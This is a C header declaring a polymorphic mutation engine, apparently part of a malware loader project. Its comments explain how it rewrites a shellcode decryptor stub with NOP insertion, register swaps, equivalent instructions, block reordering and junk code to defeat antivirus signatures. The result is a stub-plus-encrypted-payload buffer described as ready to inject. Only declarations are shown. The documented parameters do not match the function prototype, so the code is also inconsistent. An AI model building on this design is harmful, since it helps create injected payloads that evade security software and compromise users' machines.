/*
 * ==========================================================================
 *  MutationEngine.h – Polymorphic mutation engine – declarations
 * ==========================================================================
 *
 *  PURPOSE:
 *  --------
 *  The mutation engine is the HEART of a polymorphic program. Its job:
 *  take the DECRYPTOR TEMPLATE (from DecryptorStub.asm) and generate
 *  a UNIQUE version that:
 *    - does EXACTLY the same thing (decrypts the payload)
 *    - but looks COMPLETELY DIFFERENT at the byte level
 *
 *  WHY?
 *  ---------
 *  Antivirus software (AV) often looks for "signatures" – known
 *  byte sequences. If every copy of our decryptor has DIFFERENT bytes,
 *  a static signature won't work.
 *
 *  MUTATION TECHNIQUES:
 *  -----------------
 *  1. NOP insertion     – inserting NOP (no-operation) instructions at
 * random locations
 *  2. Register swap     – swapping registers for equivalents (r9 <-> r10, rcx <->
 * rdi)
 *  3. Instruction equiv – replacing instructions with equivalents (xor<->sub+not,
 * sub<->add neg)
 *  4. Block permutation – rearranging independent code blocks
 *  5. Junk code         – inserting "dead code" that does nothing
 *
 *  ARCHITECTURE:
 *  -------------
 *  The engine operates on raw x64 machine BYTES. It knows instruction
 *  boundaries in the template and modifies/replaces bytes within them.
 *  It does NOT use a compiler or assembler at runtime – everything happens
 *  through direct byte manipulation.
 * ==========================================================================
 */

#pragma once

#ifndef MUTATIONENGINE_H
#define MUTATIONENGINE_H

#include "Crypto.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ============================================================
 *  MUTATED_SHELLCODE – result of the mutation engine
 *
 *  After mutation, we get a buffer containing:
 *    [mutated decryptor stub | encrypted payload]
 *                |
 *                v
 *  The whole thing is ready to inject – the decryptor will decrypt
 *  the payload in place and then jump to it.
 * ============================================================ */
typedef struct _MUTATED_SHELLCODE {
  BYTE *pBuffer;    /* output buffer: mutated stub + encrypted payload */
  SIZE_T totalSize; /* total buffer size (stub + payload)              */
  SIZE_T stubSize; /* size of the mutated stub itself (without payload)         */
} MUTATED_SHELLCODE, *PMUTATED_SHELLCODE;

/* ============================================================
 *  MutateDecryptor() – main function of the mutation engine
 *
 *  Takes the decryptor template and generates its mutated version.
 *  Then appends the encrypted payload after the mutated stub.
 *
 *  Parameters:
 *    pTemplateStub  – pointer to raw template bytes (from DecryptorStub.asm)
 *    stubLen        – template length in bytes
 *    pEncPayload    – pointer to encrypted payload
 *    payloadLen     – payload length in bytes
 *    pKey           – Compound Cipher key (inserted into the stub)
 *    pOut           – [out] mutation result (allocated internally, caller frees)
 *
 *  Returns: TRUE = success, FALSE = error
 *
 *  IMPORTANT: The pOut->pBuffer buffer is allocated by HeapAlloc().
 *             The caller must free it using HeapFree() after use.
 * ============================================================ */
BOOL MutateDecryptor(const BYTE *pEncPayload, SIZE_T payloadLen,
                     const COMPOUND_KEY *pKey, PMUTATED_SHELLCODE pOut);

#ifdef __cplusplus
}
#endif

#endif /* MUTATIONENGINE_H */
